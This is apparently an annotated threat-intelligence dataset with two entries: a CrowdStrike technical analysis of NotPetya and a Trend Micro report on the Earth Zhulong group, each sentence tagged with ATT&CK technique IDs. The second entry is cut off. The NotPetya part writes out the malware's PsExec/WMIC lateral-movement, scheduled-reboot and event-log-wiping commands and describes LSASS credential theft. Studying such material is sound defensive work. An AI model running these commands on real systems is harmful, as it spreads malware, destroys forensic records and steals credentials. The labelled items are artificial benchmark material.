[
    {
        "doc_title": "NotPetya Technical Analysis  A Triple Threat File Encryption MFT Encryption Credential Theft",
        "cti_report": [
            "title: NotPetya Technical Analysis \u2013 A Triple Threat: File Encryption, MFT Encryption, Credential Theft url: https://www.crowdstrike.com/blog/petrwrap-ransomware-technical-analysis-triple-threat-file-encryption-mft-encryption-credential-theft/ Update: Due to naming convention consistency in the industry, CrowdStrike is now calling this variant of Petya \u2013 NotPetya. ",
            "Executive Summary This technical analysis provides an in-depth analysis and review of NotPetya. ",
            "For more information on CrowdStrike\u2019s proactive protection features see the earlier CrowdStrike blog on how Falcon Endpoint Protection prevents the NotPetya attack. ",
            "NotPetya combines ransomware with the ability to propagate itself across a network.",
            "It spreads to Microsoft Windows machines using several propagation methods, including the EternalBlue exploit for the CVE-2017-0144 vulnerability in the SMB service.",
            "This is the same vulnerability Microsoft reported on in MS17-010, which was exploited so successfully in the recent WannaCry ransomware outbreak. ",
            "Once a machine is infected by NotPetya, a series of malicious activities ensue, including the following: Dropped files Process hashes and process privilege checks Credential theft Token impersonation Malware propagation Network node enumeration SMB copy and remote execution SMBv1 exploitation via EternalBlue UNC write malware to admin$ on remote target Remote execution of the malware MBR ransomware Physical drive manipulation MFT encryption File encryption System shutdown Anti-forensics Ransomware instructions for file recovery occur after the infection process has completed.",
            "Do NOT pay the ransom.",
            "No files will be recovered if the ransom is paid. ",
            "Dropped Files ",
            "The following files are dropped by the malware: ",
            "Ransomware DLL C:\\windows\\perfc.dat ",
            "The malware decompresses its resource named 0x3 of type RT_RCDATA, and writes the contents to C:\\Windows\\dllhost.dat.",
            "Analysis of dllhost.dat shows that it is a copy of the PsExec utility, which is a telnet replacement that allows execution of processes on other systems. ",
            "C:\\windows\\dllhost.dat Credential theft module Written as a .tmp file to the temp directory Ransomware splash and warning files Command Line Execution ",
            "The malware is a DLL that is launched using rundll32.exe: \u201cC:\\Windows\\perfc.dat\u201d,#1 18",
            "[\u201cusername1:pass1\u201d \u201cusername2:pass2\u201d \u2026 ] Perfc.dat is the malware name.",
            "It is executed with the following arguments: #1 \u2192 This is the ordinal number of the exported function 18 \u2192 Minutes used to determine how long to wait for the scheduled shutdown \u201cusername:pass\u201d \u2192 Credentials to be used to propagate the malware on the network. ",
            "Process Hashes and Process Privilege Checks Upon being loaded, the malware starts a subroutine that hashes each running process on the system, and compares each hash with 3 hardcoded hashes: 0x6403527E \u2192 avp.exe associated with Kaspersky AV 0x23214B44 \u2192 ns.exe associated with Norton Security 0x651B3005 \u2192 ccSvcHst.exe associated with Symantec A global flag PROC_FLAG is used to track which of the 3 processes are running on the system. PROC_FLAG",
            "= 0xFF \u2192 none PROC_FLAG",
            "= 0xFB \u2192 ns.exe or ccSvcHst.exe PROC_FLAG",
            "= 0xF7 \u2192 avp.exe PROC_FLAG",
            "= 0xF3 \u2192 avp.exe and either ns.exe and/or ccSvcHst.exe ",
            "In addition, within the same subroutine, the malware attempts to gain various levels of privilege.",
            "It uses a global flag PRIV_FLAG to track the extent of privileges the malware is able to obtain. ",
            "PRIV_FLAG = 0 \u2192 no privileges PRIV_FLAG = 1 \u2192 SeShutdownPrivilege.",
            "Ability to shutdown the system. PRIV_FLAG",
            "= 2 \u2192 SeDebugPrivilege.",
            "Required to either debug or adjust memory for a process owned by another account PRIV_FLAG",
            "= 3 \u2192 SeShutdownPrivilege & SeDebugPrivilege PRIV_FLAG",
            "= 4 \u2192 SeTcbPrivilege.",
            "Process can assume the identity of any user PRIV_FLAG",
            "= 5 \u2192 SeShutdownPrivilege & SeTcbPrivilege PRIV_FLAG",
            "= 6 \u2192 SeDebugPrivilege & SeTcbPrivilege PRIV_FLAG",
            "= 7 \u2192 SeShutdownPrivilege & SeDebugPrivilege & SeTcbPrivilege These 2 flags have a considerable impact on the execution of the malware. ",
            "The credential theft module is dropped if the malware has one of the following privileges: (It should be noted that the PROC_FLAG can any of the possible values) SeDebugPrivilege SeShutdownPrivilege & SeDebugPrivilege SeDebugPrivilege & SeTcbPrivilege SeShutdownPrivilege & SeDebugPrivilege & SeTcbPrivilege The MBR overwrite and MFT encryption subroutine is not executed if avp.exe is found running on the system The EternalBlue subroutine is not executed if either ns.exe or ccSvcHst.exe are found running on the system The system is rebooted using the API NtRaiseHardError if the process has at least the SeShutdownPrivilege level Credential Theft Credentials are provided to the malware in two ways: ",
            "As an argument to the DLL (see command line execution section) Communication via a named pipe from the credential theft module To create a named pipe, a random GUID is generated, and the credential theft module is launched as a child process with the named pipe as an argument. ",
            "Communication is constantly monitored by a thread that invokes PeekNamedPipe to copy data from the pipe. ",
            "Credential Theft Module Depending on the OS architecture, the malware will either drop a 32-bit version or a 64-bit version of the credential theft module.",
            "The malware decompresses a resource (0x1 if the OS is x86, 0x2 if the OS is x64) of type RT_RCDATA using zlib 1.2.8 compression.",
            "The resulting contents are then written to a randomly named .tmp file in the %TEMP% folder. ",
            "Upon being loaded, the module initializes and sets up a CNG provider.",
            "It calls OpenProcess on lsass.exe with access flag set to VM_READ, and looks for the modules wdigest.dll and lsasrv.dll loaded in the lsass.exe process. ",
            "wdigest.dll \u2192 Digest authentication security package.",
            "Used to: Authenticate client access with integrity protection to a directory service using LDAP Authenticate client access using SASL Authenticate client access to a web site lsasrv.dll \u2192 Authentication security component.",
            "The lsasrv.dll is a LSA (Local Security Authority)",
            "Server service, which both enforces security policies and acts as the security package manager for the LSA This file extracts credentials from LSASS similar to Mimikatz.",
            "The extracted credentials are sent to the NotPetya process via the named pipe. ",
            "Token Impersonation Impersonation occurs only if the process has the required privilege level to assume the identity of another user. ",
            "OpenProcessToken and GetTokenInformation is used to grab the TokenSessionId for terminal service sessions.",
            "Each token is duplicated and the new handle is saved to a list. ",
            "For each of the duplicated tokens, a new thread is created in suspended mode.",
            "The impersonated token replaces the current thread token with SetThreadToken and the thread is resumed. ",
            "This thread is then used to execute the SMB copy and remote execution section as the impersonated user. ",
            "Malware Propagation The following methods are used to spread across a network: Network node enumeration SMB copy and remote execution SMB exploitation via EternalBlue Network Node Enumeration ",
            "The malware attempts to gather a list of known TCP endpoints and IP addresses to check whether it can connect to the IPs via SMB ports 445 and 139.",
            "The malware creates a thread for core work that invokes the following API\u2019s: GetExtendedTcpTable to retrieve a list of TCP endpoints GetIpNetTable to retrieve the IPv4 to physical address mapping table \u2192 Gets a MIB_IPNETTABLE structure NetServerEnum to get a list of servers on the domain with the following parameters: Servername = null level = 101 (return server names, types, and associated data) NetServerGetInfoto retrieve the current configuration for the local server, specifically to determine if the system is a non-domain controller server, a primary domain controller, or a backup domain controller.",
            "The API returns a SERVER_INFO_101 structure that contains an sv101_type field.",
            "The malware checks to see if the value of that field is SV_TYPE_SERVER_NT, SV_TYPE_DOMAIN_CTRL, or a SV_TYPE_DOMAIN_BAKCTRL.",
            "If the field is either of the values mentioned, the following takes place: DhcpEnumSubnets to get an enumerated list of subnets on the server DhcpGetSubnetInfo on each subnet on the list to get the DHCP_SUBNET_STATE value to see whether the DhcpSubnetEnabled flag is set DhcpEnumSubnetClients on each subnet with the aforementioned flag set.",
            "This function returns an enumerated list of clients associated with the IP addresses in each subnet.",
            "For each client, the following occurs: Obtains the IP address from the ClientIpAddress field in the DHCP_CLIENT_INFO structure Attempts to establish a socket connection to the client IPs over ports 445 and 139 (both associated with SMB) SMB Copy and Remote Execution There are two approaches to using valid credentials to copy and execute the malware to a remote host: Token impersonation Requires the process to have \u201cSeTchPrivilege\u201d Stolen credentials Each of these methods will be used to do a UNC write to Admin$ and then execute the malware on the target machine. ",
            "SMBv1 Exploitation via EternalBlue NotPetya has the capability to exploit SMBv1 via the well known EternalBlue exploit.",
            "Once the exploit is launched, the shellcode will end up writing the file and executing the malware on the target machine. ",
            "UNC Write to Admin$ WNetAddConnection2W is used to connect to a server using the default credentials for the impersonated token, and an attempt is made to write the file to: \\\\server-name\\\\admin$\\\\malware-name UNC write to admin$ CreateFile and WriteFile are used to write the file to the remote server.",
            "The typical filename is perfc.dat. ",
            "Remote Execution Remote execution relies on either PsExec or WMIC. ",
            "DLLHost.dat (psexec) The following command will execute on the remote machine: C:\\Windows\\dllhost.dat \\\\<target host> -accepteula -s",
            "-d C:\\Windows\\System32\\rundll32.exe \u201cC:\\Windows\\perfc.dat\u201d,#1 18 \u201c<additional creds for arguments>\u201d\u201d -accepteula \u2192 This suppresses the display of the license dialog -s",
            "\u2192 run as system -d \u2192 do not wait for process termination -u \u2192 username (not shown here) -p \u2192 password (not shown here) WMIC ",
            "The following command will execute on the remote as the specified user: C:\\Windows\\system32\\wbem\\wmic.exe /node:\u201d<server name>\u201d /user:\u201d<username>\u201d",
            "/password:\u201d<password>\u201d process call create \u201cC:\\Windows\\System32\\rundll32.exe \\\u201dC:\\Windows\\perfc.dat\\\u201d #1 19 \u201c<additional creds for arguments>\u201d\u201d /node \u2192 specify server name /user \u2192 username /password \u2192 password Process call create \u2192 execute remote command Once the command line arguments are generated, either CreateProcessAsUser or CreateProcess is executed, depending on whether this is being done through impersonation or stolen credentials. ",
            "MBR Ransomware Physical Drive Manipulation The malware calls DeviceIOControl on //./PhysicalDrive0 with IOCTL_DISK_GET_PARTITION_INFO_EX control code to get PARTITION_INFORMATION_EX structure. ",
            "The structure represents the physical location on the disk.",
            "The malware takes the following steps to modify the MBR: Reads the MBR and encodes it using XOR encoding with key 0x7 The first sector is overwritten by a custom boot loader ",
            "The next 31 sectors are then overwritten by 16-bit code that is responsible for encrypting the MFT using Salsa20 encryption Sector 32 contains the following: CRYPT_FLAG",
            "\u2013> Initially, this byte is set to 0, which denotes that the MFT has not been encrypted.",
            "The 16-bit code uses this flag to determine whether to infect the MFT A random array of bytes 0x20 in length is generated using CryptGenRangom.",
            "This is used as the Salsa20 encryption key.",
            "In addition, another random array of bytes 0x8 in length is created using the same API call; this is used as the nonce for the encryption.",
            "The malware also writes the hardcoded string 1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX in the sector.",
            "This is the Bitcoin wallet that is later displayed on the splash screen. ",
            "A random blob is created by CryptGenRandom 0x3C bytes in length.",
            "This is presented as the user\u2019s personal installation key on the splash screen.",
            "It should be noted that this personal installation key is random in nature; and therefore there is no way to trace it back to the victim machine Sector 33 contains all 0x7\u2019s.",
            "This is used as an integrity check for the decryption process. ",
            "Sector 34 contains the original MBR that was encoded by XORing with 0x7 MFT Encryption As mentioned previously, the malware has its own custom boot loader once the machine has been infected and rebooted.",
            "This code within the MBR is responsible for loading the code which encrypts the MFT using Salsa20, displays the ransom note, and accepts the private key.",
            "It should be noted that the code is a low-level 16-bit code that uses BIOS interrupt calls to display text to the user, accept user input, and read/write to various sectors.",
            "Since this code is run outside of the OS, its capabilities are quite limited. ",
            "However, its main purpose is to encrypt or decrypt the MFT, which it is able to accomplish using Salsa20.",
            "The following are the BIOS interrupt services used throughout the code: int 0x13 \u2013 read/write sectors on disk int 0x10 \u2013 display text int 0x19 \u2013 cause disk reboot int 0x16 \u2013 obtain keystrokes, and status of keyboard buffer The code first checks the CRYPT_FLAG in sector 32 to see whether it has been set to 1 (encrypted).",
            "The first time a machine is infected, the CRYPT_FLAG is always set to 0 (not encrypted), which leads the malware to invoke a subroutine that displays the following decoy check disk screen to the user. ",
            "In reality, the subroutine performs the following functions: Sets the CRYPT_FLAG to 1.",
            "This is performed before any encryption actually takes place Encrypts the contents of Sector 33 using the Salsa20 cipher.",
            "Shortly after the encryption, the buffer containing the Salsa20 key is overwritten; therefore, the key is destroyed Encrypts the MFT and stores",
            "a counter of MFT records that are encrypted Causes a disk reboot Upon a second reboot, the NotPetya ransomware note is displayed as shown below: ",
            "In addition, it initiates a loop that waits for the user to input the purchased key.",
            "Once the key is entered, the code attempts to decrypt the contents of Sector 33, which were previously encrypted using Salsa20 key.",
            "Once the sector is decrypted, the code reads all 512 bytes of the sector and ensures that they all equal 0x7.",
            "If this is successful, the CRYPT_FLAG is set to 2 (decrypted), and the same key is used to decrypt the MFT. ",
            "Furthermore, the original encoded MBR in Sector 34 is also decoded, and placed back into Sector 0, as shown below. ",
            "File Encryption Along with MFT encryption",
            ", the malware also targets certain files. ",
            "The following table contains the file extensions that are targeted: .3ds .7z .accdb .ai .asp .aspx .avhd .back .bak ",
            ".c .cfg .conf .cpp .cs .ctl ",
            ".dbf .disk .djvu .doc .docx. ",
            ".dwg ",
            ".eml .fdb .gz ",
            ".h .hdd .kdbx .mail .mdb .msg .nrg .ora ",
            ".ost .ova ",
            ".ovf ",
            ".pdf .php ",
            ".pmf .ppt .pptx .pst .pvi .py .pyc ",
            ".rar ",
            ".rtf ",
            ".sln .sql .tar .vbox .vbs .vcb .vdi .vfd .vmc ",
            ".vmdk .vmsd .vmx .vsdx .vsv .work .xls .xlsx .xvd .zip ",
            "The malware only targets fixed drives on the system.",
            "It invokes CryptGenKey to generate an AES-128 key.",
            "This key is used to encrypt all the files on the system.",
            "The malware will first start enumerating files in the directory it is being executed from.",
            "The following steps are taken to encrypt the individual files: Gets file handle Gets the file size Creates a file mapping of the file with PAGE_READWRITE protection Maps the view of the file mapping with FILE_MAP_WRITE | FILE_MAP_READ access Calls CryptEncrypt to encrypt the contents of the file using AES-128 Once the files in a folder are encrypted, the ransomware drops a ransomware note in a file named README.txt.",
            "The \u201cpersonal installation key\u201d is the result of the AES-128 key encrypted with an RSA-2048 key, which is included in the malware. ",
            "Once the README.txt is dropped on disk, CryptDestroyKey is invoked to release the handle to the key. ",
            "The following message is then displayed to the user: System Shutdown NotPetya employs a few methods to ensure that the system reboots so that the boot loader loads the MFT encryptor code. ",
            "It spawns cmd.exe with the following commandline: ",
            "/c schtasks /Create/SC once /TN \u201c\u201d /TR \u201cC:\\Windows\\system32\\shutdown.exe /r /f\u201d",
            "/ST <HH:MM> ",
            "The <HH:MM> value depends on the second parameter when being invoked by rundll32.exe.",
            "If the second parameter is 30, the scheduled task will trigger 30 minutes after the malware execution.",
            "However, if no second parameter is provided, the scheduled task is set to trigger 60 minutes after the malware execution by default. ",
            "Explanation of schtask parameters: /TN \u2192 taskname (not providing a custom name forces Windows to provide a random GUID as a name) /TR \u2192 taskrun.",
            "Path and filename of the task to be run /ST \u2192 starttime Explanation of shutdown.exe parameters: ",
            "/r \u2192 reboot after shutdown /f \u2192 forces running applications to close In addition, it also invokes the API NTRaiseHardError.",
            "This is an undocumented Windows API that causes the system to reboot.",
            "If the API fails to execute, the malware calls InitiateSystemShutdownExW with the flag set to reboot the machine. ",
            "Anti-Forensics The malware employs anti-forensics practices throughout its execution.",
            "For instance, immediately after execution, it loads itself in memory, and deletes itself from the disk.",
            "However, before deletion, it zeros out the file contents on disk to ensure that the malware cannot be recovered via disk forensics.",
            "The malware uses a similar approach for the credential theft module it drops as well.",
            "Once the contents of its resource section are decompressed and written to disk, it zeros out the memory buffer containing the decompressed PE files.",
            "Furthermore, once execution of those files take place, it zeroes out its file contents before deleting from the disk.",
            "The malware also spawns cmd.exe to execute the following command: ",
            "/c wevtutil cl Setup & wevtutil cl System & wevtutil cl Security & wevtutil cl Application & fsutil usn deletejournal /D",
            "C:\u201d This command is responsible for clearing out the following logs: Setup logs: contains events related to application setup System logs: contains events pertaining to system components Security logs: contains events such as logon attempts, file creation, access, deletion Application logs: contains events logged by applications USN journal: maintains a record of changes made to a particular volume For information on CrowdStrike\u2019s proactive protection features see the earlier CrowdStrike blog on how Falcon Endpoint Protection prevents this destructive ransomware. ",
            "Appendix A: Indicators of Compromise (IOCs) ",
            "Below is the relevant data for the files analyzed. ",
            "File: Dropper / Payload Size: 362360 MD5: 71B6A493388E7D0B40C83CE903BC6B04 SHA256: 027CC450EF5F8C5F653329641EC1FED91F694E0D229928963B30F6B0D7D3A745 Compiled: Sun, Jun 18 2017, 7:14:36 \u2013 32-bit DLL Signature Corrupt Subject: Microsoft Corporation Issuer: Microsoft Code Signing PCA ",
            "File:Credential Theft Module 32-bit Size: 47616 MD5: 2813D34F6197EB4DF42C886EC7F234A1 SHA256: EAE9771E2EEB7EA3C6059485DA39E77B8C0C369232F01334954FBAC1C186C998 Compiled: Tue, Jun 6 2017, 13:31:37 \u2013 32-bit EXE File:Credential Theft Module 64-bit Size: 57344 MD5: 7E37AB34ECDCC3E77E24522DDFD4852D SHA256: 02ef73bd2458627ed7b397ec26ee2de2e92c71a0e7588f78734761d8edbdcd9f Compiled: Tue, Jun 6 2017, 13:31:37 \u2013 64-bit EXE File: dllhost.dat Size: 381816 MD5: AEEE996FD3484F28E5CD85FE26B6BDCD SHA256: F8DBABDFA03068130C277CE49C60E35C029FF29D9E3C74C362521F3FB02670D5 Compiled: Tue, Apr 27 2010, 0:23:59 \u2013 32-bit EXE Version: 1.98 Signature Valid Subject: Microsoft Corporation Issuer: Microsoft Code Signing PCA The post NotPetya Technical Analysis \u2013 A Triple Threat: File Encryption, MFT Encryption, Credential Theft appeared first on . "
        ],
        "label": [
            [],
            [],
            [],
            [],
            [
                "T1210"
            ],
            [],
            [
                "T1570"
            ],
            [],
            [],
            [],
            [],
            [
                "T1140"
            ],
            [
                "T1140"
            ],
            [],
            [
                "T1059.003",
                "T1218.011"
            ],
            [
                "T1218.011"
            ],
            [],
            [
                "T1057"
            ],
            [
                "T1057",
                "T1518.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1106"
            ],
            [],
            [],
            [],
            [
                "T1140"
            ],
            [],
            [],
            [
                "T1003.001"
            ],
            [],
            [],
            [],
            [
                "T1003.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [
                "T1570"
            ],
            [
                "T1570"
            ],
            [
                "T1570",
                "T1210"
            ],
            [],
            [
                "T1106",
                "T1082"
            ],
            [],
            [],
            [],
            [],
            [
                "T1570",
                "T1210",
                "T1016",
                "T1078"
            ],
            [
                "T1210"
            ],
            [],
            [
                "T1106",
                "T1078"
            ],
            [],
            [],
            [],
            [],
            [
                "T1047"
            ],
            [
                "T1047"
            ],
            [
                "T1106",
                "T1059.003"
            ],
            [],
            [],
            [
                "T1027"
            ],
            [],
            [],
            [],
            [],
            [
                "T1106"
            ],
            [],
            [],
            [],
            [],
            [],
            [
                "T1140"
            ],
            [
                "T1027"
            ],
            [],
            [],
            [],
            [
                "T1140"
            ],
            [
                "T1056.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1027",
                "T1140"
            ],
            [
                "T1140"
            ],
            [
                "T1140"
            ],
            [
                "T1027",
                "T1140"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1083"
            ],
            [
                "T1083"
            ],
            [],
            [],
            [
                "T1083"
            ],
            [
                "T1106"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1218.011"
            ],
            [
                "T1053.005"
            ],
            [
                "T1053.005"
            ],
            [
                "T1053.005"
            ],
            [
                "T1053.005"
            ],
            [
                "T1106"
            ],
            [
                "T1106"
            ],
            [
                "T1106"
            ],
            [],
            [
                "T1027"
            ],
            [],
            [],
            [
                "T1140"
            ],
            [],
            [
                "T1059.003"
            ],
            [],
            [],
            [],
            [],
            [],
            []
        ]
    },
    {
        "doc_title": "Earth Zhulong Familiar Patterns Target Southeast Asian Firms",
        "cti_report": [
            "title: Earth Zhulong:",
            "Familiar Patterns Target Southeast Asian Firms url: https://www.trendmicro.com/en_us/research/23/b/earth-zhulong-familiar-patterns-target-southeast-asian-firms.html Cyber Crime Earth Zhulong:",
            "Familiar Patterns Target Southeast Asian Firms In 2022, we discovered Earth Zhulong, a hacking group that has been targeting Asian firms similar to another well-known threat actor.",
            "In this article, we unravel their new tactics, techniques and procedures that they apply on their misdeeds. ",
            "By: Ted Lee February 08, 2023Read time: ( words) Save to Folio Subscribe Introduction In 2022, we discovered a hacking group that has been targeting telecom, technology, and media sectors in Southeast Asia since 2020.",
            "We track this particular group as Earth Zhulong.",
            "We believe that Earth Zhulong is likely related to the Chinese-linked hacking group 1937CN based on similar code in the custom shellcode loader and victimology. ",
            "In this post, we\u2019ll introduce Earth Zhulong\u2019s new tactics, techniques, and procedures (TTPs) in the recent campaign and the evolution of their custom shellcode loader, \u201cShellFang\u201d.",
            "Through the TTPs, we see that they are sophisticated and meticulous as malicious actors.",
            "They adopt multiple approaches to obfuscate their tools and eliminate their footprint after finishing the operation.",
            "As a result, we have exerted greater effort to hunt down and analyze their tools to fully understand the attack scenario.",
            "In addition, we have verified three different variants of ShellFang were used from 2020 to 2022.",
            "The latest variant demonstrates that threat actors have adopted more obfuscation techniques, including abusing exception mechanisms to obfuscate the execution flow of programs and Windows API hashing. ",
            "In early 2022, we further discovered that Earth Zhulong abused group policy objects (GPO) to install loaders and launch Cobalt Strike on their target hosts.",
            "Several hack tools were also found on the infected hosts, including tunneling, port scanning, a Go-lang based backdoor and an information stealer used to harvest internal information. ",
            "Compared to old variants, code structure in the latest variant is dramatically different and there are few shared features between old and the latest variant.",
            "However, we found the relationship during the long-term investigation and finally correlated old variants with the latest one.",
            "We believe the relationship found in this research could bring this notorious hacking group back to public sight and the findings here will be helpful to future research on hacker groups which are active in Southeast Asia. ",
            "Initial Access \u2013 Lure document Back in 2020, through the command and control (C&C) domain observed in our investigation, we found a lure document with a malicious macro.",
            "Once the victim opens the document, the embedded macro will be executed, injecting the shellcode into rundll32.exe.",
            "We have identified the embedded shellcode as a Cobalt Strike shellcode which will be used to build connection to a remote hacking machine.",
            "We believe this lure document is one of the approaches used by the threat actors to compromise their targets. ",
            "Figure 1.",
            "Screenshot of decoy document Figure 2.",
            "Malicious macro embedded in the document Figure 3.",
            "Shellcode which is used for code injection. ",
            "Propagation through GPO In early 2022, we further observed new TTPs used to spread malware in the victim\u2019s environment.",
            "After getting access to the internal network, they perform domain exploration using SharpHound.",
            "Once they successfully compromise the domain controller, they will submit immediate tasks to the hosts in the domain through GPO as seen in Figure 5, As the hosts receive the task through GPO, they will run a PowerShell script named \u201cco.ps1\u201d and create scheduled tasks for persistence. Figure 4.",
            "Overview of attack scenario Figure 5.",
            "PowerShell script to create a ImmediateTask through GPO ",
            "As shown in Figure 6, threat actors use multi-layered AES encryption and base64 encoding to obfuscate \u201cco.ps1\u201d.",
            "Heavy obfuscation in a simple but useful anti-analysis approach makes it difficult for security products to detect their scripts.",
            "After clearing the obfuscation, we found the script is used to deploy malware components (win.exe, gm.dll, and lengs.medil.xml) on the infected machine. ",
            "Figure 6.",
            "Heavily obfuscated PowerShell script Figure 7.",
            "Cleaned content of co.ps1 Earth Zhulong adopted DLL sideloading techniques to run their malware.",
            "\u201cwin.exe\u201d is a renamed GoogleToolbarNotifier application.",
            "The malicious DLL \u201cgtn.dll\u201d, which we named as \u201cShellFang\u201d, loads when a legitimate executable is launched.",
            "It then calls the export function, \u201cGo\u201d, to start the loading procedure of the encrypted payload to decrypt the payload called \u201clengs.medil.xml\u201d, which is the Cobalt Strike beacon. Figure 8. win.exe file information Figure 9. win.exe will call the malicious export function in gtn.dll Evolution of ShellFang loader During the investigation, we found that Earth Zhulong started targeting Southeast Asian firms in 2020.",
            "Although they always used DLL sideloading to launch their malware, they never stopped changing the code structure of their shellcode loader.",
            "Here we summarize the information we collected from 2020 to 2022 and verify three different variants used by Earth Zhulong. ",
            "Loader prior to 2020 (Variant 1) ",
            "The earliest variant of ShellFang was observed in a victim\u2019s environment in 2020.",
            "However, based on the timestamp of export function, this variant was compiled in 2017.",
            "The code structure of ShellFang is simple.",
            "It would read the encrypted payload (\u201cnkford.nlp\u201d is the payload in this case) then decrypt it and run it in the memory.",
            "The shellcode loader used XOR with a 26 byte keyset and started a long sleep after finishing shellcode execution. Figure 10.",
            "Main function of earliest variants Loader in 2021 (Variant 2) Compared to the variant in 2020, there was no big change in 2021.",
            "They changed the decryption function into RC4 instead of the original XOR, but the code structure was basically the same as the previous variant. ",
            "Figure 11.",
            "Main function of variant in 2021 Loader in the latest campaign (2022, variant 3) Compared to previous variants, changes were seen in the code structure in variant 3.",
            "In this variant, more anti-analysis techniques were added to strengthen their loader, including API hashing and execution flow obfuscation through exception mechanism.",
            "Threat actors intentionally raise exceptions to interrupt malware analysts and obfuscate the execution flow of the program.",
            "Windows APIs are obfuscated via a hashing function and dynamically resolved in the run-time.",
            "The payload will be decrypted with RC4 algorithm, and the final payload is an HTTPs Cobalt Strike beacon. ",
            "Figure 12.",
            "A loop of intentional exception triggers to obfuscate control flow of program. ",
            "Figure 13.",
            "Necessary APIs will be dynamically resolved during execution. ",
            "Hacking Tools Besides the shellcode loader and Cobalt Strike, we also observed additional tools, including port scanner, proxy and information stealer deployed to the compromised hosts.",
            "It\u2019s worth noting that they use various programming platforms including C language, Go-Lang and Python.",
            "In this section, we will mention some noteworthy hacking tools used in their operation. ",
            "MACAMAX Although threat actors already installed the Cobalt Strike as backdoor, we also found out that they deployed another Go-Lang backdoor, which we named MACAMAX in the meantime.",
            "It supports proxy (Socks5), upload/download file and remote shell functions.",
            "Network configuration was defined in another configuration file, and it would be loaded when running the backdoor.",
            "Furthermore, the configuration file will be deleted once it is loaded into memory for fear of leaking network infrastructures. ",
            "cmd> {MACAMAX}.exe {network config file} Usage of MACAMAX -rh={remote host} -rp={remote port} -ps={proxy server} -sl=5",
            "-to=0 -cg=1 Information defined in the configuration file. ",
            "Themida-packed EarthWorm During our investigation, we found they also use the notorious network-penetration tool, \u201cEarthWorm\u201d.",
            "EarthWorm is a simple network tunnel tool with SOCKS v5 server and port transfer developed by a Chinese engineer.",
            "Although the original developer already stopped maintenance and removed the download link, it\u2019s still getting more popular in the recent cyber-attack.",
            "With this tool, the attackers are able to bypass the firewall and access the machine in a restricted network.",
            "Since EarthWorm has become more common, security vendors also provide solutions to detect this powerful tool.",
            "In order to avoid being detected by security products, threat actors use Themida packer to obfuscate the signature used for detection. ",
            "Information Stealer We found a python-based information stealer used to collect internal information of victims.",
            "This information stealer is compiled with Python 3.10 and packed by noted tools, \u201cPyInstaller\u201d, used to convert python script to be a standalone executable.",
            "After checking the Python assembly code of the sample, we found this tool is used to dump information from the victim\u2019s Oracle database.",
            "Dumped data will be stored in a csv file and compressed by WinRAR with a password (\u201c5tgb6yhn\u201d), then all compressed data will be uploaded to Dropbox at the end. ",
            "Figure 14.",
            "Oracle connection config and SQL command for information dump Figure 15.",
            "Embedded WinRAR command Figure 16.",
            "Dropbox configuration and upload RAR data Footprint Hidden and Elimination Threat actors run PowerShell scripts with previous versions of PowerShell that do not support Script Block Logging with the intent to evade being detected while running the malicious scripts (so-called \u201cDowngrade Attack\u201d).",
            "After finishing the operation, they will clean the intrusion footprint and delete important files, including payload and network configuration files, to avoid leaking any information to analysts.",
            "It is worth noting that they also corrupt their shellcode loader by wiping out the header of the file, seen in Figure 15.",
            "This is a common approach to make it harder for analysts to analyze their tools in the ransomware attack, but it\u2019s relatively rare in an APT attack.",
            "These show that they are sophisticated and meticulous actors. Figure 17.",
            "Obfuscated PowerShell script used to clean the footprint on Domain Controller Figure 18.",
            "Left is the corrupted ShellFang and the right one is the normal one. ",
            "Attribution Summarizing the information collected from 2020 to 2022, we find that Earth Zhulong is likely to be related to a notorious hacking group, \u201c1937CN\u201d based on the code similarity and victimology aspects.",
            "In this section, we will introduce the process of attribution. ",
            "Code similarity Although the earliest variant of ShellFang used in this campaign was observed in 2020, we found the malware was already compiled in 2017, based on the timestamp of an export function, which can be seen in Figure 19.",
            "In addition, we reviewed reports published around that time and found the decryption algorithm in ShellFang was once used in the campaign by 1937CN, which was revealed by Fortinet in 2017.",
            "Shown in Figure 20, the XOR keyset and algorithm are highly similar.",
            "Based on the prevalent time and algorithm, we believe Earth Zhulong is likely to be related to 1937CN. ",
            "Figure 19.",
            "Timestamp of export function in the earliest variant Figure 20.",
            "The left is the algorithm revealed by Fortinet in 2017.",
            "The right one is found in the earliest ShellFang variant. ",
            "Victimology Based on our long-term investigation, Southeast Asia is Earth Zhulong\u2019s major target, focusing on telecom and media sectors.",
            "1937CN is a well-known hacking group in Southeast Asia and has always been their major target as well.",
            "In 2016, 1937CN was suspected to attack Noi Bai and Tan Son Nhat airports in Vietnam, hijacking the flight information screens to broadcast anti-Vietnamese and anti-Philippines propaganda.",
            "In 2017, Fortinet also revealed their campaign targeting Vietnamese organizations by using a weaponized RTF document.",
            "In victimology aspects, Earth Zhulong is consistent with the 1937CN group. ",
            "Conclusion Through long-term monitoring, we found this campaign continued targeting Southeast Asia from 2020 to 2022.",
            "In the past 2 years, they always have used DLL sideloading as their major technique to launch their malware.",
            "However, they continued updating their tools and even added more anti-analysis techniques in their latest tools including multi-layer obfuscation, API obfuscation, and execution flow obfuscation by raising exceptions intentionally. ",
            "We also found they compromise the domain controller in the victim\u2019s environment and deployed Cobalt Strike on their hosts by creating immediate tasks through GPO.",
            "In addition, Go-lang and Python are also used as programming languages to build their tools.",
            "Both programming languages provide strength for cross-platform programs development.",
            "Furthermore, Python and Go-lang executables usually compile all necessary libraries in a single binary, making malware classification more difficult for analysts and resulting in a large binary.",
            "Some security products have limitations when handling large files.",
            "Which may be their approach as large binaries reduces the risk of being detected. ",
            "In the process of tracking and analyzing the data, we have identified the hacker group behind the campaign which targets organizations in Southeast Asia, and called it Earth Zhulong.",
            "Based on the victimology and usage of a highly similar decryption algorithm, we believe that Earth Zhulong is related to the hacking group known as \u201c1937CN\u201d.",
            "We hope our findings will remind the public that the actions and motivations of 1937CN continue to resurface through groups like Earth Zhulong, and that these groups remain a big threat to cybersecurity in Southeast Asia. ",
            "While the threat remains focused on Southeast Asia, tactics like this can be applied to various places across the world.",
            "It is better to stay ahead of the curve to ensure your safety against these malicious actors.",
            "Ensuring your systems are protected on all aspects is integral to the productivity of your enterprise.",
